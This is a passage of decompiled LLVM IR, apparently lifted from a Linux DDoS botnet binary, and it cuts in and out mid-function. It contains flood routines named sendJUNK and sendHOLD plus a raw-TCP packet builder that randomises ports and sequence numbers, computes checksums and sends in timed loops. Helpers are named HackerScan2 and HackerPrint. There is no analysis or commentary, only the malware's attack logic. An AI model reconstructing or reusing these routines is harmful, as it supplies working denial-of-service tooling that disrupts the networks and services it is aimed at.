  %v3_10bfc = load i8, i8* %v2_10b74, align 1
  %v4_10c04 = zext i8 %v3_10bfc to i32
  %v1_10c0c = or i32 %v4_10c04, 1
  store i32 %v1_10c0c, i32* %r2.global-to-local, align 4
  %v1_10c18 = trunc i32 %v1_10c0c to i8
  store i8 %v1_10c18, i8* %v2_10b74, align 1
  br label %dec_label_pc_10cc0

dec_label_pc_10c20:                               ; preds = %dec_label_pc_10bdc
  store i32 ptrtoint ([4 x i8]* @global_var_227ec.756 to i32), i32* @r1, align 4
  %v4_10c2c = call i32 @__GI_strcoll(i8* %v3_10b60, i32 ptrtoint ([4 x i8]* @global_var_227ec.756 to i32))
  %v2_10c34 = icmp eq i32 %v4_10c2c, 0
  br i1 %v2_10c34, label %dec_label_pc_10c3c, label %dec_label_pc_10c64

dec_label_pc_10c3c:                               ; preds = %dec_label_pc_10c20
  %v3_10c40 = load i8, i8* %v2_10b74, align 1
  %v4_10c48 = zext i8 %v3_10c40 to i32
  %v1_10c50 = or i32 %v4_10c48, 16
  store i32 %v1_10c50, i32* %r2.global-to-local, align 4
  %v1_10c5c = trunc i32 %v1_10c50 to i8
  store i8 %v1_10c5c, i8* %v2_10b74, align 1
  br label %dec_label_pc_10cc0

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c20
  store i32 ptrtoint ([4 x i8]* @global_var_227f0.758 to i32), i32* @r1, align 4
  %v4_10c70 = call i32 @__GI_strcoll(i8* %v3_10b60, i32 ptrtoint ([4 x i8]* @global_var_227f0.758 to i32))
  %v2_10c78 = icmp eq i32 %v4_10c70, 0
  br i1 %v2_10c78, label %dec_label_pc_10c80, label %dec_label_pc_10ca8

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c64
  %v3_10c84 = load i8, i8* %v2_10b74, align 1
  %v4_10c8c = zext i8 %v3_10c84 to i32
  %v1_10c94 = or i32 %v4_10c8c, 8
  store i32 %v1_10c94, i32* %r2.global-to-local, align 4
  %v1_10ca0 = trunc i32 %v1_10c94 to i8
  store i8 %v1_10ca0, i8* %v2_10b74, align 1
  br label %dec_label_pc_10cc0

dec_label_pc_10ca8:                               ; preds = %dec_label_pc_10c64
  %v2_10cac = load i32, i32* @global_var_2c5e8.50, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_10cbc = call i32 @HackerPrint(i32 %v2_10cac, i32 ptrtoint ([18 x i8]* @global_var_227f4.760 to i32))
  br label %dec_label_pc_10cc0

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10c80, %dec_label_pc_10c3c, %dec_label_pc_10bf8, %dec_label_pc_10bb4, %dec_label_pc_10b70, %dec_label_pc_10ca8
  %v2_10cc8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  %v2_10cd8 = icmp eq i32 %v2_10cc8, 0
  br i1 %v2_10cd8, label %dec_label_pc_10ce0, label %dec_label_pc_10b54

dec_label_pc_10ce0:                               ; preds = %dec_label_pc_10cc0, %dec_label_pc_10b38, %dec_label_pc_10a80
  %v0_10ce0 = call i32 @rand_cmwc()
  %v1_10cf4 = trunc i32 %v0_10ce0 to i16
  %v3_10cf4 = add i32 %v3_109ac, 34
  %v4_10cf4 = inttoptr i32 %v3_10cf4 to i16*
  store i16 %v1_10cf4, i16* %v4_10cf4, align 2
  %v3_10d00 = add i32 %v3_109ac, 36
  %v4_10d00 = inttoptr i32 %v3_10d00 to i16*
  store i16 0, i16* %v4_10d00, align 4
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  %v3_10d0c = add i32 %v3_109ac, 38
  %v4_10d0c = inttoptr i32 %v3_10d0c to i16*
  store i16 0, i16* %v4_10d0c, align 2
  br i1 %v2_10848, label %dec_label_pc_10d1c, label %dec_label_pc_10d34

dec_label_pc_10d1c:                               ; preds = %dec_label_pc_10ce0
  %v0_10d1c = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_10d1c to i16
  br label %dec_label_pc_10d50

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10ce0
  %v3_10d3c = urem i32 %arg2, 65536
  %v1_10d44 = call i32 @__GI_htons(i32 %v3_10d3c)
  %extract.t72 = trunc i32 %v1_10d44 to i16
  br label %dec_label_pc_10d50

dec_label_pc_10d50:                               ; preds = %dec_label_pc_10d1c, %dec_label_pc_10d34
  %v0_10d1c.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10d1c ], [ %extract.t72, %dec_label_pc_10d34 ]
  %v3_10d58 = add i32 %v3_109ac, 22
  %v4_10d58 = inttoptr i32 %v3_10d58 to i16*
  store i16 %v0_10d1c.sink.off0, i16* %v4_10d58, align 2
  %v2_10d64 = call i32 @tcpcsum(i32 %v3_109ac, i32 %v1_109cc)
  %v1_10d74 = trunc i32 %v2_10d64 to i16
  store i16 %v1_10d74, i16* %v4_10d00, align 4
  store i32 %v3_109ac, i32* %r2.global-to-local, align 4
  %v1_10d84 = or i32 %v3_109ac, 2
  %v2_10d84 = inttoptr i32 %v1_10d84 to i16*
  %v3_10d84 = load i16, i16* %v2_10d84, align 2
  %v4_10d84 = zext i16 %v3_10d84 to i32
  %v2_10d90 = inttoptr i32 %v3_109ac to i16*
  %v3_10d90 = call i32 @csum(i16* %v2_10d90, i32 %v4_10d84)
  %sext3 = mul i32 %v3_10d90, 65536
  %v1_10d94 = sdiv i32 %sext3, 65536
  store i32 %v1_10d94, i32* %r2.global-to-local, align 4
  %v1_10da0 = trunc i32 %v1_10d94 to i16
  %v3_10da0 = add i32 %v3_109ac, 10
  %v4_10da0 = inttoptr i32 %v3_10da0 to i16*
  store i16 %v1_10da0, i16* %v4_10da0, align 2
  %v2_10da8 = call i32 @__GI_time(i32* null)
  %v2_10db4 = add i32 %v2_10da8, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10dc8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_10e08 = add i32 %v3_109ac, 12
  %v3_10e08 = inttoptr i32 %v2_10e08 to i32*
  %v3_10e20 = or i32 %v3_109ac, 4
  %v4_10e20 = inttoptr i32 %v3_10e20 to i16*
  br label %dec_label_pc_10dc4

dec_label_pc_10dc4:                               ; preds = %dec_label_pc_10ed4, %dec_label_pc_10ec8, %dec_label_pc_10d50
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_10d50 ], [ 0, %dec_label_pc_10ec8 ], [ %v1_10ed8, %dec_label_pc_10ed4 ]
  store i32 %v3_109ac, i32* %r2.global-to-local, align 4
  %v1_10dcc = load i32, i32* @sp, align 4
  %v2_10dcc = inttoptr i32 %v1_10dcc to i32*
  store i32 %v2_10dc8, i32* %v2_10dcc, align 4
  %v1_10dd4 = load i32, i32* @sp, align 4
  %v2_10dd4 = add i32 %v1_10dd4, 4
  %v3_10dd4 = inttoptr i32 %v2_10dd4 to i32*
  store i32 16, i32* %v3_10dd4, align 4
  %v0_10ddc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1097c, i32* %r2.global-to-local, align 4
  %v6_10de8 = call i32 @__libc_sendto(i32 %v3_108cc, i32 %v0_10ddc, i32 %v1_1097c, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10df0 = call i32 @HackerScan2(i32 %storemerge9)
  %v1_10dfc = call i32 @__GI_htonl(i32 %v1_10df0)
  store i32 %v1_10dfc, i32* %r2.global-to-local, align 4
  store i32 %v1_10dfc, i32* %v3_10e08, align 4
  %v0_10e0c = call i32 @rand_cmwc()
  %v3_10e18 = urem i32 %v0_10e0c, 65536
  store i32 %v3_10e18, i32* %r2.global-to-local, align 4
  %v1_10e20 = trunc i32 %v0_10e0c to i16
  store i16 %v1_10e20, i16* %v4_10e20, align 4
  %v0_10e24 = call i32 @rand_cmwc()
  store i32 %v0_10e24, i32* %r2.global-to-local, align 4
  store i32 %v0_10e24, i32* %v3_10a30, align 8
  %v0_10e34 = call i32 @rand_cmwc()
  %v1_10e48 = trunc i32 %v0_10e34 to i16
  store i16 %v1_10e48, i16* %v5_109d0, align 4
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_10d00, align 4
  %v4_10e60 = call i32 @tcpcsum(i32 %v3_109ac, i32 %v1_109cc)
  %v1_10e70 = trunc i32 %v4_10e60 to i16
  store i16 %v1_10e70, i16* %v4_10d00, align 4
  store i32 %v3_109ac, i32* %r2.global-to-local, align 4
  %v3_10e80 = load i16, i16* %v2_10d84, align 2
  %v4_10e80 = zext i16 %v3_10e80 to i32
  %v3_10e8c = call i32 @csum(i16* %v2_10d90, i32 %v4_10e80)
  %sext5 = mul i32 %v3_10e8c, 65536
  %v1_10e90 = sdiv i32 %sext5, 65536
  store i32 %v1_10e90, i32* %r2.global-to-local, align 4
  %v1_10e9c = trunc i32 %v1_10e90 to i16
  store i16 %v1_10e9c, i16* %v4_10da0, align 2
  %v9_10ea8 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_10ea8, label %dec_label_pc_10eb0, label %dec_label_pc_10ed4

dec_label_pc_10eb0:                               ; preds = %dec_label_pc_10dc4
  %v2_10eb4 = call i32 @__GI_time(i32* null)
  store i32 %v2_10eb4, i32* %r2.global-to-local, align 4
  %v8_10ec4 = icmp sgt i32 %v2_10eb4, %v2_10db4
  br i1 %v8_10ec4, label %dec_label_pc_10ee4, label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10eb0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10dc4

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10dc4
  %v1_10ed8 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_10dc4

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10eb0, %dec_label_pc_10884, %dec_label_pc_10930, %dec_label_pc_108e4
  %v1_10ef0 = phi i32 [ %v3_10894, %dec_label_pc_10884 ], [ %v3_10940, %dec_label_pc_10930 ], [ %v3_108f4, %dec_label_pc_108e4 ], [ %v2_10eb4, %dec_label_pc_10eb0 ]
  ret i32 %v1_10ef0

; uselistorder directives
  uselistorder i32 %v1_10e90, { 1, 0 }
  uselistorder i32 %v0_10e0c, { 1, 0 }
  uselistorder i32 %v1_10d94, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_10b74, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_10a84, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_10a0c, { 1, 0 }
  uselistorder i32 %v1_109cc, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_109ac, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_1097c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 0, 2, 1 }
  uselistorder i32 (i16*, i32)* @csum, { 0, 1, 3, 4, 2 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 1, 0, 2 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 9, 8, 7, 6, 5, 4, 3, 2, 1, 14, 13, 12, 11, 10, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10ee4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10d50, { 1, 0 }
  uselistorder label %dec_label_pc_10cc0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10b54, { 1, 0 }
  uselistorder label %dec_label_pc_10978, { 1, 0 }
  uselistorder label %dec_label_pc_10884, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 69420, i32* %stack_var_-4, align 4
  %v2_10f28 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10f28, i32* @fp, align 4
  %v0_10f44 = call i32 @getdtablesize()
  store i32 %v0_10f44, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_10f44, 0
  %v3_10f4c = zext i1 %tmp to i32
  %v2_10f50 = add i32 %v3_10f4c, %v0_10f44
  %v3_10f54 = sdiv i32 %v2_10f50, 2
  store i32 2, i32* %stack_var_-72, align 4
  %v3_10f6c = urem i32 %arg2, 65536
  %v1_10f74 = call i32 @__GI_htons(i32 %v3_10f6c)
  %v3_10f90 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-68)
  %v2_10f98 = icmp eq i32 %v3_10f90, 0
  br i1 %v2_10f98, label %dec_label_pc_10fa4, label %dec_label_pc_11414

dec_label_pc_10fa4:                               ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_10fb8 = bitcast i32* %stack_var_-64 to i8*
  %v3_10fb8 = call i32 @__GI_memset(i8* %v2_10fb8, i32 0)
  %v3_10fc0 = mul i32 %v3_10f54, 8
  %v1_10fc4 = or i32 %v3_10fc0, 7
  %v1_10fc8 = add i32 %v1_10fc4, 7
  %v3_10fcc = and i32 %v1_10fc8, -8
  %v1_10fd4 = load i32, i32* @sp, align 4
  %v2_10fd4 = sub i32 %v1_10fd4, %v3_10fcc
  %v1_10fe4 = add i32 %v2_10fd4, 15
  %v3_10fe8 = and i32 %v1_10fe4, -8
  %v2_1100c = mul i32 %v3_10f54, 5
  store i32 %v2_1100c, i32* @r2, align 4
  %v2_1101c = inttoptr i32 %v3_10fe8 to i8*
  %v3_1101c = call i32 @__GI_memset(i8* %v2_1101c, i32 0)
  %v1_11024 = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_1103c = inttoptr i32 %v1_11024 to i8*
  %v3_1103c = call i32 @__GI_memset(i8* %v2_1103c, i32 0)
  %v2_11044 = call i32 @__GI_time(i32* null)
  store i32 %v2_11044, i32* %r2.global-to-local, align 4
  %v2_11050 = add i32 %v2_11044, %arg3
  %v2_1118c = ptrtoint i32* %stack_var_-200 to i32
  %v2_111e4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_11250 = ptrtoint i32* %stack_var_-208 to i32
  %v2_11294 = ptrtoint i32* %stack_var_-216 to i32
  %v2_11298 = ptrtoint i32* %stack_var_-212 to i32
  %v2_1111c = ptrtoint i32* %stack_var_-72 to i32
  %v8_113f445 = icmp sgt i32 %v2_10f50, 1
  %v2_111e8 = add i32 %v2_111e4, -176
  br label %dec_label_pc_113fc

dec_label_pc_11068:                               ; preds = %dec_label_pc_113ec.preheader, %dec_label_pc_113e0
  %storemerge248 = phi i32 [ %v1_113e4, %dec_label_pc_113e0 ], [ 0, %dec_label_pc_113ec.preheader ]
  store i32 %v3_10fe8, i32* %r2.global-to-local, align 4
  %v3_11074 = mul i32 %storemerge248, 8
  %v2_11078 = add i32 %v3_11074, %v3_10fe8
  %v2_1107c = or i32 %v2_11078, 4
  %v1_11080 = inttoptr i32 %v2_1107c to i8*
  %v2_11080 = load i8, i8* %v1_11080, align 4
  %v6_1108c = icmp eq i8 %v2_11080, 0
  %v7_1108c = icmp eq i8 %v2_11080, 1
  br i1 %v7_1108c, label %dec_label_pc_111a0.lr.ph, label %dec_label_pc_11094

dec_label_pc_11094:                               ; preds = %dec_label_pc_11068
  %v7_11098 = icmp eq i8 %v2_11080, 2
  br i1 %v7_11098, label %dec_label_pc_11360, label %dec_label_pc_110a0

dec_label_pc_110a0:                               ; preds = %dec_label_pc_11094
  br i1 %v6_1108c, label %dec_label_pc_110b0, label %dec_label_pc_113e0

dec_label_pc_110b0:                               ; preds = %dec_label_pc_110a0
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_110c0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v5_110cc = mul i32 %storemerge248, 8
  %v6_110cc = add i32 %v5_110cc, %v3_10fe8
  %v7_110cc = inttoptr i32 %v6_110cc to i32*
  store i32 %v3_110c0, i32* %v7_110cc, align 8
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_110d8 = inttoptr i32 %v2_11078 to i32*
  %v7_110d8 = load i32, i32* %v6_110d8, align 8
  store i32 %v7_110d8, i32* @r4, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_110e4 = load i32, i32* %v6_110d8, align 8
  store i32 %v7_110e4, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_110f4 = call i32 @__libc_fcntl(i32 %v7_110e4, i32 3)
  %v1_110fc = or i32 %v2_110f4, 2048
  store i32 %v1_110fc, i32* @r3, align 4
  %v0_11100 = load i32, i32* @r4, align 4
  store i32 %v1_110fc, i32* %r2.global-to-local, align 4
  %v2_1110c = call i32 @__libc_fcntl(i32 %v0_11100, i32 4)
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11118 = load i32, i32* %v6_110d8, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_1112c = call i32 @__libc_connect(i32 %v7_11118, i32 %v2_1111c, i32 16)
  %v3_11134 = icmp eq i32 %v3_1112c, -1
  br i1 %v3_11134, label %dec_label_pc_1113c, label %dec_label_pc_11150

dec_label_pc_1113c:                               ; preds = %dec_label_pc_110b0
  %v0_1113c = call i32 @__GI___errno_location()
  %v1_11144 = inttoptr i32 %v0_1113c to i32*
  %v2_11144 = load i32, i32* %v1_11144, align 4
  %v7_11148 = icmp eq i32 %v2_11144, 115
  br i1 %v7_11148, label %dec_label_pc_11168, label %dec_label_pc_11150

dec_label_pc_11150:                               ; preds = %dec_label_pc_110b0, %dec_label_pc_1113c
  store i32 %v3_10fe8, i32* %r2.global-to-local, align 4
  %v7_11158 = load i32, i32* %v6_110d8, align 8
  %v1_11160 = call i32 @__GI_close(i32 %v7_11158)
  br label %dec_label_pc_113e0

dec_label_pc_11168:                               ; preds = %dec_label_pc_1113c
  store i32 %v2_1107c, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_11080, align 4
  br label %dec_label_pc_113e0

dec_label_pc_111a0.lr.ph:                         ; preds = %dec_label_pc_11068
  br label %dec_label_pc_111a0

dec_label_pc_111a0:                               ; preds = %dec_label_pc_111a0.lr.ph, %dec_label_pc_111a0
  %storemerge37 = phi i32 [ 0, %dec_label_pc_111a0.lr.ph ], [ %v1_111b4, %dec_label_pc_111a0 ]
  store i32 %v2_1118c, i32* %r2.global-to-local, align 4
  %v5_111ac = mul nuw nsw i32 %storemerge37, 4
  %v6_111ac = add i32 %v5_111ac, %v2_1118c
  %v7_111ac = inttoptr i32 %v6_111ac to i32*
  store i32 0, i32* %v7_111ac, align 4
  %v1_111b4 = add nuw nsw i32 %storemerge37, 1
  %tmp39 = icmp ult i32 %v1_111b4, 32
  br i1 %tmp39, label %dec_label_pc_111a0, label %dec_label_pc_111c8

dec_label_pc_111c8:                               ; preds = %dec_label_pc_111a0
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_111d0 = inttoptr i32 %v2_11078 to i32*
  %v7_111d0 = load i32, i32* %v6_111d0, align 8
  %v3_111d4 = udiv i32 %v7_111d0, 32
  store i32 -176, i32* %r2.global-to-local, align 4
  %v3_111e0 = mul nuw nsw i32 %v3_111d4, 4
  %v2_111ec = add i32 %v2_111e8, %v3_111e0
  %v1_111f0 = inttoptr i32 %v2_111ec to i32*
  %v2_111f0 = load i32, i32* %v1_111f0, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_111fc = load i32, i32* %v6_111d0, align 8
  %v1_11200 = urem i32 %v7_111fc, 32
  %v6_11208 = shl i32 1, %v1_11200
  %v2_1120c = or i32 %v6_11208, %v2_111f0
  store i32 %v2_1120c, i32* %v1_111f0, align 4
  store i32 0, i32* %stack_var_-208, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11244 = load i32, i32* %v6_111d0, align 8
  %v1_11248 = add i32 %v7_11244, 1
  store i32 %v1_11248, i32* %r2.global-to-local, align 4
  %v1_11254 = load i32, i32* @sp, align 4
  %v2_11254 = inttoptr i32 %v1_11254 to i32*
  store i32 %v2_11250, i32* %v2_11254, align 4
  %v0_11258 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_1118c, i32* %r2.global-to-local, align 4
  %v4_11268 = load i32, i32* %stack_var_-208, align 4
  %v5_11268 = call i32 @__libc_select(i32 %v0_11258, i32 0, i32 %v2_1118c, i32 0, i32 %v4_11268)
  %v7_11278 = icmp eq i32 %v5_11268, 1
  br i1 %v7_11278, label %dec_label_pc_11280, label %dec_label_pc_1131c

dec_label_pc_11280:                               ; preds = %dec_label_pc_111c8
  store i32 4, i32* %stack_var_-212, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11290 = load i32, i32* %v6_111d0, align 8
  store i32 %v7_11290, i32* %r2.global-to-local, align 4
  %v1_1129c = load i32, i32* @sp, align 4
  %v2_1129c = inttoptr i32 %v1_1129c to i32*
  store i32 %v2_11298, i32* %v2_1129c, align 4
  %v0_112a0 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_112b0 = load i32, i32* %stack_var_-212, align 4
  %v5_112b0 = call i32 @getsockopt(i32 %v0_112a0, i32 1, i32 4, i32 %v2_11294, i32 %v4_112b0)
  %v3_112b4 = load i32, i32* %stack_var_-216, align 4
  %v2_112b8 = icmp eq i32 %v3_112b4, 0
  br i1 %v2_112b8, label %dec_label_pc_112f8, label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_11280
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_112c8 = load i32, i32* %v6_111d0, align 8
  %v1_112d0 = call i32 @__GI_close(i32 %v7_112c8)
  store i32 %v2_1107c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11080, align 4
  br label %dec_label_pc_113e0

dec_label_pc_112f8:                               ; preds = %dec_label_pc_11280
  store i32 %v2_1107c, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_11080, align 4
  br label %dec_label_pc_113e0

dec_label_pc_1131c:                               ; preds = %dec_label_pc_111c8
  %v3_11320 = icmp eq i32 %v5_11268, -1
  br i1 %v3_11320, label %dec_label_pc_11328, label %dec_label_pc_113e0

dec_label_pc_11328:                               ; preds = %dec_label_pc_1131c
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11330 = load i32, i32* %v6_111d0, align 8
  %v1_11338 = call i32 @__GI_close(i32 %v7_11330)
  store i32 %v2_1107c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11080, align 4
  br label %dec_label_pc_113e0

dec_label_pc_11360:                               ; preds = %dec_label_pc_11094
  %v2_11368 = call i32 @makeRandomStr(i32 %v1_11024, i32 1024)
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_11374 = inttoptr i32 %v2_11078 to i32*
  %v7_11374 = load i32, i32* %v6_11374, align 8
  store i32 1024, i32* %r2.global-to-local, align 4
  %v4_11388 = call i32 @__libc_send(i32 %v7_11374, i32 %v1_11024, i32 1024, i32 16384)
  %v3_11390 = icmp eq i32 %v4_11388, -1
  br i1 %v3_11390, label %dec_label_pc_11398, label %dec_label_pc_113e0

dec_label_pc_11398:                               ; preds = %dec_label_pc_11360
  %v0_11398 = call i32 @__GI___errno_location()
  %v1_113a0 = inttoptr i32 %v0_11398 to i32*
  %v2_113a0 = load i32, i32* %v1_113a0, align 4
  %v7_113a4 = icmp eq i32 %v2_113a0, 11
  br i1 %v7_113a4, label %dec_label_pc_113e0, label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %dec_label_pc_11398
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_113b4 = load i32, i32* %v6_11374, align 8
  %v1_113bc = call i32 @__GI_close(i32 %v7_113b4)
  store i32 %v2_1107c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11080, align 4
  br label %dec_label_pc_113e0

dec_label_pc_113e0:                               ; preds = %dec_label_pc_110a0, %dec_label_pc_1131c, %dec_label_pc_11360, %dec_label_pc_11398, %dec_label_pc_11328, %dec_label_pc_112f8, %dec_label_pc_112c0, %dec_label_pc_11168, %dec_label_pc_11150, %dec_label_pc_113ac
  %v1_113e4 = add nuw nsw i32 %storemerge248, 1
  store i32 %v1_113e4, i32* %r2.global-to-local, align 4
  %v5_113f8 = icmp slt i32 %v1_113e4, %v3_10f54
  br i1 %v5_113f8, label %dec_label_pc_11068, label %dec_label_pc_113fc

dec_label_pc_113fc:                               ; preds = %dec_label_pc_113ec.preheader, %dec_label_pc_113e0, %dec_label_pc_10fa4
  %v2_11400 = call i32 @__GI_time(i32* null)
  store i32 %v2_11400, i32* %r2.global-to-local, align 4
  %v5_11410 = icmp slt i32 %v2_11400, %v2_11050
  br i1 %v5_11410, label %dec_label_pc_113ec.preheader, label %dec_label_pc_11414

dec_label_pc_113ec.preheader:                     ; preds = %dec_label_pc_113fc
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_113f445, label %dec_label_pc_11068, label %dec_label_pc_113fc

dec_label_pc_11414:                               ; preds = %dec_label_pc_113fc, %entry
  %v1_11420 = phi i32 [ %v3_10f90, %entry ], [ %v2_11400, %dec_label_pc_113fc ]
  ret i32 %v1_11420

; uselistorder directives
  uselistorder i32 %v1_113e4, { 2, 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_11080, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1107c, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_11078, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge248, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 12, 11, 10, 0, 13 }
  uselistorder i32 %v2_1118c, { 3, 2, 0, 1 }
  uselistorder i32 %v3_10fe8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_10f54, { 1, 2, 0 }
  uselistorder i32 %v0_10f44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 36, 33, 32, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 0, 1 }
  uselistorder i32 -176, { 1, 0 }
  uselistorder label %dec_label_pc_113e0, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_111a0, { 1, 0 }
  uselistorder label %dec_label_pc_11150, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 70704, i32* %stack_var_-4, align 4
  %v2_1142c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1142c, i32* @fp, align 4
  %v0_11448 = call i32 @getdtablesize()
  store i32 %v0_11448, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_11448, 0
  %v3_11450 = zext i1 %tmp to i32
  %v2_11454 = add i32 %v3_11450, %v0_11448
  %v3_11458 = sdiv i32 %v2_11454, 2
  store i32 2, i32* %stack_var_-80, align 4
  %v3_11470 = urem i32 %arg2, 65536
  %v1_11478 = call i32 @__GI_htons(i32 %v3_11470)
  %v3_11494 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_1149c = icmp eq i32 %v3_11494, 0
  br i1 %v2_1149c, label %dec_label_pc_114a8, label %dec_label_pc_119c0

dec_label_pc_114a8:                               ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_114bc = bitcast i32* %stack_var_-72 to i8*
  %v3_114bc = call i32 @__GI_memset(i8* %v2_114bc, i32 0)
  %v3_114c4 = mul i32 %v3_11458, 8
  %v1_114c8 = or i32 %v3_114c4, 7
  %v1_114cc = add i32 %v1_114c8, 7
  %v3_114d0 = and i32 %v1_114cc, -8
